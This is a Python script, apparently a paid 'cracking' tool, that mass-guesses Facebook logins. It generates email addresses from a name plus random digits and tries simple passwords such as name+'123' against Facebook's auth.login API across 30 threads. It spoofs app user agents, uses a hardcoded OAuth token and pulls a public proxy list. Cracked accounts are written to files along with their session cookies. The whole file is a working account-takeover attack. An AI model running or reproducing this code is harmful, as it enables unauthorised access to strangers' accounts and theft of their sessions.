import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('rm -rf Gmail_plus.py')
loop = 0
oks = []
cps = []
ugen=[]
ses=requests.Session()
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen=[]
for xd in range(10000):
    a= random.choice(["4.0;","5.0;","6.0;","7.0;","8.0;","9.0;","10.0;","11.0;","12.0;","13.0;"])
    b = random.choice(["GT-I9505","SM-G930F","SM-J210F","SM-A720F","Z987","SM-G950U","SM-G925F","SM-N9005","CPH1909","SM-A205GN","AGS2-L09","LML713DL","CPH1987","Hisense Hi  3","vivo V3Max","POT-LX1","SM-N975U","SM-N960F","moto e6","SM-G955F","DRA-LX2","E6653","GT-I9300","SM-G970U1","POT-LX3","KFMUWI","Pixel 3","VOG-L29","moto e5 plus","SM-J730F","SM-A505GT","Redmi Note 7","EVR-N29","SM-G532G","SM-G960U","LG-H901","SM-A305F","Redmi Note 8T","CPH1727","oppo r7sm","SM-S111DL","SM-J410G","DUB-LX1","Lenovo A6020a46","FIG-LX1","Kirin Treble","SM-G973F","HUAWEI LUA-L21","ATU-L31","NX55","SM-J320F","SM-G3518","SM-A505FM","SM-G930V","moto g(20)","SM-G986U","SM-A102U","COL-L29","moto e","SM-A326U","SM-G532M","Quest 2","SM-A107M","LM-X420","LGL355DL","moto g power (2021)","Lenovo TB-X505F","RMX2155","SM-A115M","ASUS_I005DC","SM-T290","S45B","5003D_EEA","SM-G990U","220333QAG","vivo 1935","ASUS_Z01QD","NAM-LX9","LM-Q610.FG","RMX3151","SM-J250F","Moto","M2006C3MNG","2201117SY","moto e(7i) power","D6503","moto g go","moto e(7)","Pixel 6a","POCOPHONE F1","SM-A326B","MMB29K","GT-N7105","SM-N975F","SM-S901U","F1w","TECNO KI5k","SM-A217F","M5 Note","SM-S134DL","Dragon Face","Vowney","JKM-LX1","CPH2385","SM-A125F","M2101K7BNY","moto g play - 2023","M2103K19G","SM-T835","Leelbox","Z6356T","RNE-L22","Samsung Galaxy S21","SM-G780G"])
    c = random.choice(["NRD90M","JLS36C","KOT5506","HUAWEIDUB-LX1","M1AJB","LYZ28N","N6F26Q","NRD90U","R16NW","MMB29T","HUAWEIEVR-N29","QP1A.190711.020","PPR1.180610.011","OPPS27.91-179-8-16","HUAWEIVOG-L29","QQ3A.200605.001","NS6315","HUAWEIPOT-L03","IMM76D","32.4.A.1.54","HUAWEIDRA-LX2","PCB29.73-65-3","HUAWEIPOT","LMY47V","NRD9OM","OPM1.171019.019","HUAWEIAGS2","O11019","NJH47F","KTU84P","MMB29Q","LRX22C"])
    d= str(random.randint(43, 120))
    e= str(random.randint(2357, 6099))
    f= str(random.randint(43, 124))
    g= random.choice(['en;','en-US;','TL-tl;','en_GB;','zh-CN;','ru;'])
    h= str(random.randint(361, 386))
    i= str(random.randint(1, 14))
    j= str(random.randint(3, 115))
    ua= random.choice(["Dalvik/2.1.0 (Linux; U; Android 12; SM-A125F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/384.0.0.18.104;FBPN/com.facebook.orca;FBLC/lt_LT;FBBV/412138691;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-A125F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=720,height=1465};FB_FW/1;]",
"Dalvik/2.1.0 (Linux\; U\; Android 13\; M2101K7BNY Build/TP1A.220624.014) [FBAN/AudienceNetworkForAndroid\;FBSN/Android\;FBSV/13\;FBAB/cat.mansion.merge.games\;FBAV/1.06\;FBBV/106\;FBVS/6.14.0\;FBLC/ru_RU]",
"Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-181-5) [FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]",
"Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/416.0.0.9.76;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/491071575;FBCR/JAZZTEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2103K19G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.375,width=1080,height=2138};FB_FW/1;] FBBK/1",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-T835 Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/339015011;FBCR/YES OPTUS;FBMF/samsung;FBBD/samsung;FBDV/SM-T835;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1600,height=2452};FB_FW/1;]",
"Dalvik/2.1.0 (Linux; U; Android 13; Leelbox Build/PPR1.281373.396) [FBAN/FB4A;FBAV/271.0.0.55.109;FBBV/215365690;FBDM/{density=3.0,width=1080,height=2208};FBLC/en_GB;FBRV/216077496;FBCR/inwi;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1989;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"Dalvik/2.1.0 (Linux; U; Android 11; Z6356T Build/RP1A.201005.001) [FBAN/Orca-Android;FBAV/428.0.0.35.115;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/520514255;FBCR/Telstra;FBMF/ZTE;FBBD/ZTE;FBDV/Z6356T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.25,width=720,height=1466};FB_FW/1;]",
"Dalvik/2.1.0 (Linux; U; Android 11; Z6356T Build/RP1A.201005.001) [FBAN/Orca-Android;FBAV/428.0.0.35.115;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/520514424;FBCR/Telstra;FBMF/ZTE;FBBD/ZTE;FBDV/Z6356T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1476};FB_FW/1;]",
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; RNE-L22 Build/HUAWEIRNE-L22) [FBAN/Orca-Android;FBAV/426.0.0.27.102;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/515381945;FBCR/Telkomsel;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/RNE-L22;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2050};FB_FW/1;]",
"Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.miniclip.carrom;FBAV/15.2.0;FBBV/931;FBVS/6.16.0;FBLC/en_GB]",
"Dalvik/2.1.0 (Linux; U; Android 13.0; Samsung Galaxy S21 Build/OPR1.8610) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/Samsung Galaxy S21;FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/{density=3.0}]",
"Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build/RKQ1.201004.002) [FBAN/Orca-Android;FBAV/433.0.0.32.117;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/532438891;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1",
"Dalvik/2.1.0 (Linux; U; Android 13; SM-G780G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/435.0.0.32.108;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/537314828;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBDV/SM-G780G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2168};FB_FW/1"])
    ugen.append(ua)

def leeua():
 omp = str(random.randint(111, 383))
 rdp = str(random.randint(11111111, 38333333))
 return "[FBAN/FB4A;FBAV/"+omp+".0.0.37."+omp+";FBPN/com.facebook.katana;FBLC/in_ID;FBBV/"+rdp+";FBCR/Telenor;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2325;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1520};FB_FW/1;]"
 
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

main_menu= ("""
\033[1;93m  ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╦╗╔═╗  ╦ ╦╔═╗╔═╗╦═╗
\033[1;97m  ║║║║╣ ║  ║  ║ ║║║║║╣    ║ ║ ║  ║ ║╚═╗║╣ ╠╦╝
\033[1;32m  ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝   ╩ ╚═╝  ╚═╝╚═╝╚═╝╩╚═
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mEDITOR       \033[1;32m  ║ \033[1;32mZWE-LAY          
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mTELEGRAM    \033[1;32m   ║ \033[1;32mWAI-LIN-OO    
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mSTATUS       \033[1;32m  ║ \033[1;32mGMAIL CLONE        
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mTOOL VERSION \033[1;32m  ║ \033[1;32m18+\033[1;32m〘PAID〙
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═ """)
def linex():
	print(f' \033[1;97m═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═')
	
singlea= ("""
\033[1;93m         ╔═╗╦╔╗╔╔═╗╦  ╔═╗  ╔╗╔╔═╗╔╦╗╔═╗
\033[1;97m         ╚═╗║║║║║ ╦║  ║╣   ║║║╠═╣║║║║╣ 
\033[1;32m         ╚═╝╩╝╚╝╚═╝╩═╝╚═╝  ╝╚╝╩ ╩╩ ╩╚═╝
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")

domaina= ("""
\033[1;93m         ╦╔╗╔╔═╗╦ ╦╔╦╗  ╔╦╗╔═╗╔╦╗╔═╗╦╔╗╔
\033[1;97m         ║║║║╠═╝║ ║ ║    ║║║ ║║║║╠═╣║║║║
\033[1;32m         ╩╝╚╝╩  ╚═╝ ╩   ═╩╝╚═╝╩ ╩╩ ╩╩╝╚╝
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")

###------limit-----------####
limita= ("""
\033[1;93m         ╔═╗╦═╗╔═╗╔═╗╦╔═  ╦  ╦╔╦╗╦╔╦╗
\033[1;97m         ║  ╠╦╝╠═╣║  ╠╩╗  ║  ║║║║║ ║ 
\033[1;32m         ╚═╝╩╚═╩ ╩╚═╝╩ ╩  ╩═╝╩╩ ╩╩ ╩ 
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")

starta= ("""\033[1;32m
\033[1;93m    ╔═╗╔╦╗╔═╗╦═╗╔╦╗  ╔═╗╦═╗╔═╗╔═╗╦╔═╦╔╗╔╔═╗
\033[1;97m    ╚═╗ ║ ╠═╣╠╦╝ ║   ║  ╠╦╝╠═╣║  ╠╩╗║║║║║ ╦
\033[1;32m    ╚═╝ ╩ ╩ ╩╩╚═ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╩╝╚╝╚═╝
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mEDITOR       \033[1;32m  ║ \033[1;32mZWE-LAY          
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mTELEGRAM    \033[1;32m   ║ \033[1;32mWAI-LIN-OO    
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mSTATUS       \033[1;32m  ║ \033[1;32mGMAIL CLONE        
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mTOOL VERSION \033[1;32m  ║ \033[1;32m18+\033[1;32m〘PAID〙  
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")

def main():
    os.system('clear')
    print(main_menu)
    print("  \033[1;32m〘\033[1;97m1\033[1;32m〙 \033[1;97mSTART CRACKING")
    print("  \033[1;32m〘\033[1;97m0\033[1;32m〙 \033[1;97mEXIT TOOL                     ")
    linex()
    ZWE = input(f'\033[1;32m  〘\033[1;97m?\033[1;32m〙 \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        single()
    if ZWE in ["0","X"]:        
        os.system('exit')
        
def single():
                user=[]
                os.system('clear')
                print(singlea)               
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mwailin\033[1;32m〙〘\033[1;97mzawmyo\033[1;32m〙〘\033[1;97mphyowai\033[1;32m〙")
                linex()
                first = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mSINGLE NAME :\033[1;32m ')
                os.system('clear')
                print(domaina)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m@gmail.com\033[1;32m〙〘\033[1;97m@yahoo.com\033[1;32m〙")
                linex()
                domain = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(limita)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m3000\033[1;32m〙〘\033[1;97m5000\033[1;32m〙〘\033[1;97m10000\033[1;32m〙")
                linex()
                try:
                        limit=int(input("\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=30) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(starta)
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID        \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME      \033[1;32m║ \033[1;32m'+first+'')
                        print(f"  \033[1;32m〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+digitx+domain
                                pwx=[digitx+first,first+digitx,first,first+'123',first+'1234',first+'12345',first+'@123',first+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)                                
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r \033[1;32m〘%sZWE-LAY\033[1;32m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'      %    (bi,loop,tl,len(oks)))
            sys.stdout.flush()
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1', 
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'meta_inf_fbmeta': '', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': leeua(), 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1="https://api.facebook.com/method/auth.login"
            lo=session.post(url1,data=data,headers=head).json()
            if 'session_key' in lo:
                coki=";".join(i["name"]+"="+i["value"] for i in lo["session_cookies"])	
                print(f"\033[1;32m  〘✔〙{uid} ※ {ps} " '  \n\033[1;97m〘COOKIE〙 = '+coki+  '')
                linex()
                open('/sdcard/ZWE-LAY-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(lo):            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[1;90m  〘✘〙{uid} ※ {ps} ")
                open('/sdcard/ZWE-LAY-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1 
        sys.stdout.write(f'\r\r \033[1;32m〘%sZWE-LAY\033[1;32m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'    %  (bi,loop,tl,len(oks)))
        sys.stdout.flush()
    except:
        pass
main()                
	